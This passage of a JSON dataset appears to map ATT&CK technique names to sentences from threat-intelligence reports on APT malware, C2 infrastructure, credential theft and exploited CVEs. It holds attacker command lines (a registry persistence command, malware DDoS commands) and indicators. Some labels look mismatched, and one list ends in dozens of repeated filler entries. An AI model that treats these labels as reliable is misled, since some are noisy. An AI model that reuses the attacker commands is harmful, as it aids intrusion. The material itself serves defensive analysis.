        "They combine reconnaissance of GPO (Group Policy Object management for execution) with digitally-signed malware to avoid detection or blocking during their infection phases",
        "Stolen code signing certificates used to sign malware",
        "Many of this APT\u2019s components are signed with phony Intel and AMD digital certificates"
    ],
    "standard cryptographic protocol": [
        "Figure 9: Example of callback Earlier versions of UPPERCUT used the hard-coded string \u201cthis is the encrypt key\u201d for Blowfish encryption when communicating with a C2",
        "If the <flag> field of the message header is greater than one, the XOR key used to encrypt message bodies is iterated in reverse when encrypting and decrypting messages",
        "A 256-bit AES session key is generated and used to encrypt both message headers and bodies separately",
        "Initially, the key is sent to the C2 server with the entire message and headers encrypted with the RSA key exchange algorithm",
        "Based upon the instructional guide and the provided tools, this package appears consistent with the methodologies FireEye outlined in their research on how these attacks were executed, including specific details such as the use of ICAP via a proxy passthrough, in this case specifically squid, and using certbot to create a Let\u2019s Encrypt SSL certificate",
        "The backdoor's infrequent beaconing, traffic obfuscation, extensive encryption and use of geographically local, legitimate websites for command and control (C2) make identification of its network traffic difficult",
        "Encrypting communications using AES and RSA public key cryptography   5",
        "The AES key is unique for each communication and is encrypted with one of two RSA public keys",
        "Figure 12 and Figure 13 show the RSA keys used in FELIXROOT, and Figure 14 shows the AES encryption parameters",
        "Figure 19.\u00a0Scrambling \u2018Mac OSX 10.12\u2019  Encryption  The scrambled byte sequence is passed onto the constructor of the class Packet::Packet, which creates a random AES256 key and encrypts the buffer with this key",
        "It first grabs an encrypted blob stored away in a global variable and pulls out 381 bytes of this encrypted data:  The standard win32 api CryptDecrypt uses rc4 to decrypt this blob into a hardcoded c2, url path, and url parameters listed below with a simple 140-bit key \u201c\\x8B\\xFF\\x55\\x8B\\xEC\\x83\\xEC\\x50\\xA1\\x84\\x18\\x03\\x68\\x33\\xC9\\x66\\xF7\\x45\\x10\\xE8\\x1F\\x89\\x45\\xFC\\x8B\\x45\\x14\\x56\u2033"
    ],
    "screen capture standard application layer protocol exfiltration over command and control channel data encoding remote file copy-multi": {
        "technique_names": [
            "screen capture",
            "standard application layer protocol",
            "exfiltration over command and control channel",
            "data encoding",
            "remote file copy"
        ],
        "sentances": [
            "Commands   Description    0x97A168D9697D40DD  Download and validate file (XXHash comparison) from C2 server    0x7CF812296CCC68D5  Upload file to C2 server    0x652CB1CEFF1C0A00  Load PE file    0x27595F1F74B55278  Download, validate (XXHash comparison), execute file, and send output to C2 server    0xD290626C85FB1CE3  Format the current timestamp    0x409C7A89CFF0A727  Capture the desktop screenshot in PNG format and send it to C2    None of the above  The received buffer is executed via cmd.exe and the output is then sent to the C2 server    Table 5: Supported commands  Conclusion While APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving"
        ]
    },
    "web service": [
        "These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949",
        "Command and Control Infrastructure: Compromised servers, messaging platforms, and cloud service providers to avoid detection",
        "In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process",
        "Some APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, Google, and Pastebin for initial C2 communications",
        "This RAT communicates with 5.189.145.248, a command and control (C2) IP address that this group has used previously with other malware, including DarkComet and NJRAT",
        "BRONZE UNION appears to use a combination of self-registered IP addresses and commercial VPN services in its command and control (C2) and operational infrastructure",
        "LOWBALL abuses the Dropbox cloud storage service for command and control (CnC)",
        "The attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts.[2][3] A Cyber Campaign Likely Intended to Monitor Hong Kong Media During a Period of Crisis The threat group has previously used newsworthy events as lures to deliver malware.[4] They have largely targeted organizations involved in financial, economic and trade policy, typically using publicly available RATs such as Poison Ivy, as well some non-public backdoors.[5] The group started targeting Hong Kong media companies, probably in response to political and economic challenges in Hong Kong and China",
        "Firstly, the Trojan will use the following regular expression to determine if the C2 server wishes to cancel the C2 communications:       216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com     Additionally, the RogueRobin Trojan uses the regular expressions in Table 3 to confirm that the DNS response contains the appropriate data for it to extract information from",
        "The string is formatted as \u201c<domain list>|<minimum query size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<maximum requests>|<query types>|<hibridMode>|<current query mode>\u201d   ^slp Sets the sleep and jitter values   ^exit Exits the Trojan    Table 5 Commands available within the C# variant of RogueRobin Using Google Drive for C2 A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C# variant is the x_mode",
        "This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API",
        "To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account",
        "Figure 4 x_mode command and new line delimited settings As seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive",
        "Variable Name Description   gdu Google Drive URL for downloading files to the Google Drive account   gduu Google Drive URL for uploading files to the Google Drive account   gdue Google Drive URL for updating a file on the Google Drive account   gdo2t Google Drive URL used to get the OAUTH access_token   client_id The client_id for the OAUTH application   cs The client_secret for OAUTH   r_t The refresh_token for OAUTH    Table 6 Variables used to store settings needed to use Google Drive as a C2 To obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data",
        "Figure 6 Hardcoded Google Drive URL used in RogueRobin sample When the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive",
        "To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4: c<unique identifier><job identifier padded with \u20180\u2019 to make three digits><sequence number>c.<C2 domain> The Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier",
        "Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure",
        "The Delphi variant of Cannon does not use legitimate web-based email services for its C2 communications, instead opting to use email accounts at an actor owned domain, ambcomission[.]com",
        "Then pastebin.com, github.com, mailimg.com, upload.cat, dev-point.com and pomf.cat were used as channels for the different malware stages before achieving a full RAT implementation, which then communicates with the corresponding C2 server",
        "However, the attacks different stages were hosted on a variety of free sites such as Mailimg, Github, Pastebin, dev-point.co, a.pomf.cat, and upload.cat",
        "The command index table and command handler address table.\u00a0 Implant Capabilities Based on the responses received from the control server, the malware can carry out the following malicious tasks:  Recursively generate a list of files in a directory and send to the control server Terminate a specific process",
        "The actor has the following demonstrated capabilities:To include exploits (for Hangul and Microsoft Office) in its workflows.To modify its campaigns by splitting the payload in to multiple stages To use compromised web servers or legitimate cloud based platforms",
        "Here is a list of the platforms used by this variant: Twitter, Yandex and Mediafire",
        "The majority of documents used the name \u201cgerry knight\u201d for the author field in the document metadata, and the embedded macros largely used direct IP connections to command and control (C2) servers rather than using domain names",
        "It has historically leveraged legitimate third-party websites to host the malware\u2019s command and control (C2) information, acting as \u201cdead drops\u201d",
        "This tactic uses public web services to host content that contains encoded commands that are decoded by the malware",
        "This can be seen in the following images taken from hxxp:// feeds.rapidfeeds[.]com/88604/, which is one of the dead drop resolvers we encountered in this sample:  Figure 7 Dead drop resolver used by BADNEWS \u00a0 In order to decrypt this data, the authors have included additional steps from previous versions",
        "One of the malware families tied to this group, BADNEWS, continues to be updated both in how it uses dead drop resolvers, as well as how it communicates with a remote C2 server",
        "Some of the targeted apps\u00a0were:  \u00a0 Whatsapp  YouTube Video\u00a0Downloader  Google\u00a0Update \u00a0 Instagram  Hack\u00a0Wifi \u00a0 AirDroid \u00a0 WifiHacker   \u00a0 Facebook \u00a0 Photoshop \u00a0 SkyTV   \u00a0 Hotstar  Trump\u00a0Dash \u00a0 PokemonGo  With many more to\u00a0come",
        "Receiving C2 instructions from user profiles created by the adversary on legitimate websites/forums such as Github and Microsoft's TechNet portal",
        "An increasingly popular tactic by threat actors is to use legitimate hosting services like Google Cloud or CloudFlare for their payload and C2\u00a0 infrastructure, making it much more difficult to safely block IPs",
        "Hidden Content The primary command and control location used in this campaign is hosted on a blog on blogspot[.]com, which enables the threat actors to hide their malicious content behind a legitimate service",
        "In some cases, the encoded PowerShell commands were used to download and execute content hosted on the paste site hxxps://pastebin[.]com",
        "five threads are for forwarding collected data to four cloud services (Box, Dropbox, Pcloud and Yandex). When uploading stolen data to a cloud service",
        "The group also used GitHub as a repository for tools that it downloaded post-compromise."
    ],
    "scripting registry run keys / startup folder-multi": {
        "technique_names": [
            "scripting",
            "registry run keys / startup folder"
        ],
        "sentances": [
            "All of the backdoors identified - excluding RoyalDNS - required APT15 to create batch scripts in order to install its persistence mechanism",
            "They consist mainly of persistence mechanisms and simple instructions despite their different forms (VBS scripts, PowerShell scripts, known software with open source code that can be backdoored, and in-house built dotnet apps)",
            "Downloading stylesheets allows for emended JavaScript and VBS to be run from within them, at which point any type of malware could be staged and run quite easily"
        ]
    },
    "remote system discovery": [
        "Additional tools were recovered during the incident, including a network scanning/enumeration tool, the archiving tool WinRAR and a bespoke Microsoft SharePoint enumeration and data dumping tool, known as 'spwebmember'",
        "Once inside the network of a hospitality company, APT28 sought out machines that controlled both guest and internal Wi-Fi networks.\u00a0No guest credentials were observed being stolen at the compromised hotels; however, in a separate incident that occurred in Fall 2016, APT28 gained initial access to a victim\u2019s network via credentials likely stolen from a hotel Wi-Fi network.\u00a0 Upon gaining access to the machines connected to corporate and guest Wi-Fi networks, APT28 deployed Responder",
        "At a high-level, their targeting of financial organizations and subsequent heists have followed the same general pattern:   Information Gathering: Conducted research into an organization\u2019s personnel and targeted third party vendors with likely access to SWIFT transaction systems to understand the mechanics of SWIFT transactions on victim networks (Please note: The systems in question are those used by the victim to conduct SWIFT transactions",
        "Host enumeration and lateral movement After gaining an initial foothold in a compromised environment, the threat actors quickly identify and explore accessible systems",
        "In one example, BRONZE UNION actors leveraged initial web shell access on Internet-facing systems to conduct internal reconnaissance, including domain enumeration and network state, via ipconfig, net use, net user, and net view commands",
        "The Trojan checks to see if the result of this query returned a class with more than 0 elements, which would most likely be true in a non-virtual environment",
        "The primary difference was that this sample was encrypted and password protected, requiring the victim to enter in a password which was likely provided by the adversary to view the document",
        "This technique allows them to map network resources and make lateral movements inside the network, landing in the perfect machine to match the attacker\u2019s interest",
        "(Source: Dell SecureWorks) Over a few days' span, the threat actors install remote access tools on additional systems based upon the results of the network reconnaissance"
    ],
    "credential dumping": [
        "The tool would connect to the SQL SharePoint database and issue a query to dump all data from the database to a temporary file affixed with 'spdata'",
        "APT15 was also observed using Mimikatz to dump credentials and generate Kerberos golden tickets",
        "During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump",
        "APT40 leverages custom credential theft utilities such as HOMEFRY, a password dumper/cracker used alongside the AIRBREAK and BADFLICK backdoors",
        "NetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords including:  Login passwords of remote computers on LAN",
        "Our observation of related\u00a0actions\u00a0here:    u ps start password stealing (Windows)   Ps_mps/ps_hwi start start password stealing (Linux, MIPS,\u00a0 ARM)   uper_mps/uper_hwi start rewrite hook module with a new version and launch it (Linux, MIPS, ARM)   Nm_mps/nm_hwi start\u00a0 \u2013ban -middle Scan ports and retrieve banners on the router\u00a0subnet\u00a0 (Linux, MIPS,\u00a0 ARM)   U fsget * 7 *.docx, *.pdf, *.doc * search for docs with the given filetypes (Windows)   S sinfo retrieve information on installed programs and launch commands: systeminfo, tasklist, ipconfig, netstat, route print, tracert www.google.com (Windows)   weap_mps/weap_hwi host188.128.123.52 port[25,26,110,465,995]\u00a0 typetcpconnect DDoS on 188.128.123.52 (Linux, MIPS,\u00a0 ARM)   weap_mps/weap_hwi\u00a0 typesynflood port80 cnt100000 spdmedium host212.175.109.10 DDoS on 212.175.109.10 (Linux, MIPS,\u00a0 ARM)    The issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM devices.\u00a0We want to pay special attention to the DDoS commands meant for these routers",
        "The information contained in this data dump include:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Scripts to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  The Leak In mid-March 2019, an unknown entity appeared on several hacking forums and Twitter with the user handle @Mr_L4nnist3r claiming they had access to data dumps involving internal tools and data used by the OilRig group",
        "The datasets included:  Stolen credentials Potential systems to login to using stolen credentials Deployed webshell URLs Backdoor tools Command and control server component of backdoor tools Script to perform DNS hijacking Documents identifying specific individual operators Screenshots of OilRig operational systems  We analyzed each type of dataset other than the documents containing detailed information on alleged OilRig operators and they remain consistent with previously observed OilRig tactics, techniques, and procedures (TTPs)",
        "In total, nearly 13,000 sets of credentials are included in the data dump",
        "The credentials appear to have been stolen via multiple techniques, including using post-exploition password recovery tools such as MimiKatz or its variant ZhuMimiKatz",
        "In addition to these tools, we believe OilRig attackers obtained credentials through, bruteforcing, SQL injections, and using traditional credential harvesting toolkits as we discussed in the Striking Oil blog published in September 2017",
        "It appears to us that one organization had its entire Active Directory dumped out, making up most of the credentials we found in the data dump",
        "We are unable to confirm if all of these stolen credentials are indeed valid sets of credentials, but based upon previously observed activity, timestamping, and known behaviors, it is highly probable that these credentials were or may still be valid",
        "Assuming the lists of credentials are valid, the mass collection confirms our hypothesis that the OilRig group maintains a heavy emphasis on credential based attacks along with the other types of attacks they deploy",
        "When entered, these credentials are then sent to the C2 server, which allows DarkHydrus to collect the user account credentials",
        "Credential Harvesting Attack On June 24, 2018, Unit 42 observed DarkHydrus carrying out a credential harvesting attack on an educational institution in the Middle East",
        "Figure 2 Employee survey displayed after credential theft The November 2017 document displays a password handover document after credential theft occurs, as seen in Figure 3",
        "Figure 3 Password handover form displayed after credential theft The infrastructure used in these credential harvesting attacks used the domain 0utl00k[.]net, which at the time of the attacks resolved to 107.175.150[.]113 and 195.154.41[.]150",
        "Figure 6 Authentication dialog box with fake credentials entered On the C2 server, we observed Phishery receiving the inbound request and capturing the credentials, as seen in Figure 7",
        "Vault was implemented in Windows 7, it contains any sensitive data (like the credentials) of Internet Explorer",
        "The malware accepts up to two arguments at the command line: one to display cleartext credentials for each login session, and a second to display cleartext credentials, NTLM hashes, and malware version for each login session",
        "This private data includes stored passwords, login credential information from Web browsers, and a variety of cryptocurrency wallets",
        "Alerts for credential theft tools and privileged account lockouts should be investigated",
        "(Source: Dell SecureWorks)   TG-3390 actors have also used the following publicly available tools:  Windows Credential Editor (WCE) \u2014 obtains passwords from memory gsecdump \u2014 obtains passwords from memory winrar \u2014 compresses data for exfiltration nbtscan \u2014 scans NetBIOS name servers  Tactics, techniques, and procedures Incident response engagements have given CTU researchers insight into the tactics TG-3390 employs during intrusions",
        "15 Database dump Decoded, it reveals a detailed log of each affected machine",
        "Mimikatz to obtain credentials.",
        "",
        "Also, the use of the  mimikatz and pwdump tools suggests the adversary attempts to dump credentials on compromised systems",
        "It was heavily modified, with almost all original code stripped out aside from its sekurlsa::logonpasswords credential stealing feature"
    ],
    "process hollowing masquerading-multi": {
        "technique_names": [
            "process hollowing",
            "masquerading"
        ],
        "sentances": [
            "They utilised Windows commands in order to enumerate and conduct reconnaissance activities such as tasklist.exe, ping.exe, netstat.exe, net.exe, systeminfo.exe, ipconfig.exe and bcp.exe",
            "During our analysis, we observed one loader running \u201crr.exe\u201d with the following arguments:open cmd.exe /c c:\\\\temp\\\\rr.exe SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run \"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\spp.exe\" iexploreThe \u201crr.exe\u201d payload dropped to the system does nothing more than use the supplied command line arguments to create a registry key to execute the payload each time the system starts",
            "In all of the DropIt samples we collected, the dropper will then save the executable to the user\u2019s %TEMP% folder and execute the file, specifically to one of the following filenames:  %TEMP%\\spp.exe %TEMP%\\sloo.exe %TEMP%\\spoo.exe %TEMP%\\vschos.exe  We have also seen Magic Hound using DropIt like a binder Trojan, specifically dropping a legitimate decoy executable along with the malicious executable as a payload"
        ]
    },
    "fallback channels": [
        "Domains The RoyalCli backdoor was attempting to communicate to the following domains:  News.memozilla[.]org video.memozilla[.]org  The BS2005 backdoor utilised the following domains for C2:  Run.linodepower[.]com Singa.linodepower[.]com log.autocount[.]org  RoyalDNS backdoor was seen communicating to the domain:  andspurs[.]com  Possible linked APT15 domains include:  Micakiz.wikaba[.]org cavanic9[.]net ridingduck[.]com zipcodeterm[.]com dnsapp[.]info   Published date:\u00a0 10 March 2018   Written by:\u00a0 Rob Smallridge",
        "In order to extend the lifespan of the domains in case one or more are blacklisted, there are twelve different C2 domains that xparis() can be set to",
        "Indicators of Compromise (IoCs)    C&C servers    Ssl[.]arkouthrie[.]com   s3[.]hiahornber[.]com   widget[.]shoreoa[.]com       SHA256   Delivery document (W2KM_OCEANLOTUS.A): 2bb855dc5d845eb5f2466d7186f150c172da737bfd9c7f6bc1804e0b8d20f22a   Dropper (OSX_OCEANLOTUS.D): 4da8365241c6b028a13b82d852c4f0155eb3d902782c6a538ac007a44a7d61b4   Backdoor (OSX_OCEANLOTUS.D): 673ee7a57ba3c5a2384aeb17a66058e59f0a4d0cddc4f01fe32f369f6a845c8f   The post New MacOS Backdoor Linked to OceanLotus Found appeared first on",
        "Additionally malware reports itself to its hardcoded command and control servers and established a backdoor connection, so the attacker may have a permanent remote connection"
    ],
    "file and directory discovery": [
        "Business and government personnel who are traveling, especially in a foreign country, often rely on systems to conduct business other than those at their home office, and may be unfamiliar with threats posed while abroad",
        "These files are downloaded to a directory (C:\\Users\\Public\\Libraries\\tempsys) on the infected machine by Bxaki() and xparis()",
        "In this particular case in 2013, the config file included an unknown plugin set, aside from the usual \u2018ddos\u2019 plugin listing",
        "The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a file extension from the following list with no parameters: gif, jpg, png, htm, html, php",
        "The body of the POST request may contain files contained in the cabinet format",
        "It should be noted that the Win32/KillDisk.NBB variant used against media companies is more focused on destroying various types of files and documents",
        "Figure 3 \u2013 A list of file extensions targeted for destruction by new variant of KillDisk component As well as being able to delete system files to make the system unbootable \u2013 functionality typical for such destructive trojans \u2013 the KillDisk variant detected in the electricity distribution companies also appears to contain some additional functionality specifically intended to sabotage industrial systems",
        "This is the only instance we observed where a hardcoded Google Drive URL was included in RogueRobin, which may suggest that the author may have overlooked this during testing",
        "HD Creates a file in the Temp path and names it \u201chd\u201d + PCID then invokes another program module named hd.test1 to identify logical drives",
        "Implant directory contained in the malicious Flash file",
        "Otherwise, it runs a search for the \u201c/bin/rsyncd\u201d string within the files found in the /etc/ folder",
        "watch/?   search/?  find/?    results/? open/?    search/?  close/?   The \u201cai\u201d value stands for the payload title",
        "DRIVE Lists the logical drives and the type, as well the total/free space of the fixed devices",
        "Command Description   !Dir Lists the contents of a specified directory   !Drives Enumerates the storage drives attached to the system and their respective type",
        "The dropped files are either in the root of the \u201cProgramData\u201d folder or in a subdirectory",
        "The file names may vary from one version of the malware to another",
        "In one version of the malware, the code checks if the \u201cProgramData\u201d folder has folders or files with the keywords \u201cKasper\u201c, \u201cPanda\u201c, or \u201cESET\u201c",
        "It mimics the icon Finder usually applies to JPEG or text files to increase the likelihood the recipient will double-click the file",
        "Figure 7: Property list file in LaunchAgents directory To camouflage the location of the malicious file, Keydnap replaces argv[0] with /usr/libexec/icloudsyncd\u00a0\u2013launchd\u00a0netlogon.bundle",
        ".iqy files are simple text files containing a URL which are opened by default by Excel",
        "The file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files",
        "Unlike a previously reported variant, this version of BADNEWS no longer looks at USB drives for interesting files",
        "4 Upload edg499.dat, which includes the list of interesting files",
        "Since it is a very long term group, some victims may be impossible to identify now",
        "These platforms may not be well maintained and may break intermittently",
        "PHOTO: a DLL backdoor also reported publicly as \u201cDerusbi\u201d, capable of obtaining directory, file, and drive listing; creating a reverse shell; performing screen captures; recording video and audio; listing, terminating, and creating processes; enumerating, starting, and deleting registry keys and values; logging keystrokes, returning usernames and passwords from protected storage; and renaming, deleting, copying, moving, reading, and writing to files",
        "This allows the shell to upload and download files, execute applications with web server account permissions, list directory contents, access Active Directory, access databases, and any other action allowed by the .NET runtime",
        "Included in the directories were a combination of files leveraged in targeted attacks mentioned above against nation states",
        "Open directory listing of hxxp://stevemike-fireforce[.]info/ Based on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in use",
        "High Commissioner of Bangladesh Pakistan eying Sukhoi-35 fighter planes as part of defense deal from Russia 2018.143 PG COURSE IN 2018-2021 BATCH India Bangladesh and Pakistan Press Release on Observance of Historic Mujibnogor Dibosh by Pakistan Mission on 17 April 2018 Afghan Bomb Blast report by ISI USAJOBS Daily Saved Search Results for New GS15 for 3/30/2018 How Rigging take place in Senate Elections in Pakistan Afghan Terrorist group details ISI Restricted113 1971 Liberation War Freedom Fighters in Pakistan Army Custody Database  Additionally, the following filenames were witnessed in these attacks (spelling and grammar mistakes included):  Liberation Freedom Fighter.xlam NSC details of participants.xlam Raw Sect Vikram report on Pak Army Confidential.doc USA Immagration Policy for Families.ppam doc CV FM.doc doc Sukhoi35 deal report.doc Nominal Roll.doc Press Release 17 April.doc Afghan Blast report by ISI.doc Rigging in Pakistan Senate.doc Afghan Terrorist group report.doc  \u00a0 The payloads for these attacks varied in malware family",
        "With the exception of the \u2018Speed\u2019 method previously mentioned, the names of the methods called in this chain appear to be fairly random, as seen in the following list: \u00a0  ETransaksi.Speed ETransaksi.diomadnfagaghagh ETransaksi.fjcsERIfjfiojsGHIsdifjksi ETransaksi.gsgjIDJIGJIGJIGJIFDOSpl ETransaksi.FJaioefgkaoeK  \u00a0 The last two methods in the chain carry out a majority of the first payload\u2019s functionality",
        "Hashes For a list of all hashes of malware encountered during this campaign, please refer to the following file",
        "17 Complete List of Malware Files  Fig",
        "17-3 Function names To target specific victims, Astaroth is locale aware; any attempts to run the malware without locale spoofing will result in failed downloads and the inability to run the .dll files",
        "119 readFiles Obtains file information on a file or a folder, and supports a \u201c*\u201d wildcard and recursive file list",
        "Get Directory Information The malware gets information for the provided directory address using the following WINAPI calls:",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "searches for files",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\",
        "dir c:\\"
    ],
    "exploitation for client execution": [
        "2, 2018, we published a blog detailing the use of\u00a0an Adobe Flash zero-day vulnerability\u00a0(CVE-2018-4878) by a suspected North Korean cyber espionage group that we now track as APT37 (Reaper)",
        "Observed vulnerabilities include:  CVE-2012-0158  CVE-2017-0199  CVE-2017-8759  CVE-2017-11882       Figure 2: APT40 attack lifecycle  Establish Foothold APT40 uses a variety of malware and tools to establish a foothold, many of which are either publicly available or used by other threat groups",
        "On October 10, 2017, Kaspersky Lab\u2019s advanced exploit prevention systems identified a new Adobe Flash zero day exploit used in the wild against our customers",
        "We are also highly confident that BlackOasis was also responsible for another zero day exploit (CVE-2017-8759) discovered by FireEye in September 2017.\u00a0 The FinSpy payload used in the current attacks (CVE-2017-11292) shares the same command and control (C2) server as the payload used with CVE-2017-8759 uncovered by FireEye",
        "Some lure documents used in these attacks are shown below: Decoy documents used in BlackOasis attacks To summarize, we have seen BlackOasis utilizing at least five zero days since June 2015:  CVE-2015-5119 \u2013 June 2015 CVE-2016-0984 \u2013 June 2015 CVE-2016-4117 \u2013 May 2016 CVE-2017-8759 \u2013 Sept 2017 CVE-2017-11292 \u2013 Oct 2017  Attacks Leveraging CVE-2017-11292 The attack begins with the delivery of an Office document, presumably in this instance via e-mail.\u00a0 Embedded within the document is an ActiveX object which contains the Flash exploit",
        "What does it mean for everyone and how to defend against such attacks, including zero-day exploits? For CVE-2017-11292 and other similar vulnerabilities, one can use the killbit for Flash within their organizations to disable it in any applications that respect it.\u00a0 Unfortunately, doing this system-wide is not easily done, as Flash objects can be loaded in applications that potentially do not follow the killbit",
        "This document exploited a newer vulnerability, CVE-2017-0199",
        "This change is because Group 123 did not target South Korea during this campaign and Microsoft Office is standard in the rest of the world.Infection VectorsThe attackers exploited CVE-2017-0199 in order to download and execute a malicious HTA document inside of Microsoft Office",
        "Even when we observed LuckyMouse using weaponized documents with CVE-2017-11882 (Microsoft Office Equation Editor, widely used by Chinese-speaking actors since December 2017), we can\u00b4t prove they were related to this particular attack",
        "This time, weaponized lure documents claiming to contain seminar information on environmental protection were observed exploiting known Microsoft Office vulnerabilities CVE-2017-0199 and CVE-2017-11882 to drop and execute the backdoor binary on the victim\u2019s machine",
        "In this campaign, we observed threat actors exploiting CVE-2017-0199 and CVE-2017-11882 to distribute malware",
        "Conclusion CVE-2017-0199 and CVE-2017-11882 are two of the more commonly exploited vulnerabilities that we are currently seeing",
        "Figure 2: Zyklon attack flow Infection Techniques CVE-2017-8759 This vulnerability was discovered by FireEye in September 2017, and it is a vulnerability we have observed being exploited in the wild",
        "Figure 3: Embedded URL in OLE object CVE-2017-11882 Similarly, we have also observed actors leveraging another recently\u00a0discovered vulnerability (CVE-2017-11882) in Microsoft Office",
        "In many cases, additional stealers, RATs, and other malware were observed being hosted on the same web servers.Analysis of HawkEye Reborn The campaign starts with sending the aforementioned Excel sheets that exploit the well-known CVE-2017-11882 vulnerability, an arbitrary code execution bug in Microsoft Office",
        "Less than a week after Microsoft issued a patch for CVE-2017-11882 on Nov",
        "14, 2017, FireEye observed an attacker using an exploit for the Microsoft Office vulnerability to target a government organization in the Middle East",
        "In this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER",
        "CVE-2017-11882: Microsoft Office Stack Memory Corruption Vulnerability CVE-2017-11882 affects several versions of Microsoft Office and, when exploited, allows a remote user to run arbitrary code in the context of the current user as a result of improperly handling objects in memory",
        "Figure 3: CVE-2017-11882 and POWRUNER attack sequence  The malicious .rtf file exploits CVE-2017-11882",
        "An RTF, an MSI file, a .NET Wrapper and two stages of Shellcode walk into a bar\u2026 Our journey begins with an RTF file named \u201cNew Salary Structure 2017.doc\u201d, which exploits CVE-2017-0199",
        "Second, the threat actors exploit CVE-2017-8570 to achieve code execution via a malicious \u201cscriptlet\u201d file, or .sct file, which is also embedded in the malicious RTF document",
        "Older documents used by Patchwork focused on the CVE-2017-0261 vulnerability, however in late January 2018 when, paradoxically, newer documents abandoned this vulnerability to attack the older CVE-2015-2545 vulnerability",
        "Try to exploit the following Remote Code Execution vulnerabilities in the targeted servers:  a) CVE-2012-0874: JBoss Enterprise Application Platform Multiple Security Bypass Vulnerabilities b) CVE-2010-1871: JBoss Seam Framework remote code execution c) JBoss AS 3/4/5/6: Remote Command Execution (exploit) d) CVE-2017-10271: Oracle WebLogic wls-wsat Component Deserialization RCE e) CVE-2018-2894: Vulnerability in the Oracle WebLogic Server component of Oracle Fusion Middleware",
        "Attack chain of Tropic Trooper\u2019s operations Here\u2019s a summary of the attack chain of Tropic Trooper\u2019s recent campaigns:  Execute a command through exploits for CVE-2017-11882 or CVE-2018-0802, security flaws in Microsoft Office\u2019s Equation Editor (EQNEDT32.EXE)",
        "We believe the adversary exploited a recently vulnerability in Microsoft SharePoint tracked by , which is a remote code execution vulnerability used to compromise the server and eventually install a webshell",
        "The attack involved the new HAWKBALL backdoor being delivered via well-known Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802."
    ],
    "exploitation for privilege escalation": [
        "Exploited Vulnerabilities: Frequent exploitation of vulnerabilities in Hangul Word Processor (HWP), as well as Adobe Flash",
        "APT40 leverages exploits in their phishing operations, often weaponizing vulnerabilities within days of their disclosure",
        "Leveraging data from Kaspersky Security Network, we identified two other similar exploit chains used by BlackOasis in June 2015 which were zero days at the time.\u00a0 Those include CVE-2015-5119 and CVE-2016-0984, which were patched in July 2015 and February 2016 respectively.\u00a0 These exploit chains also delivered FinSpy installation packages",
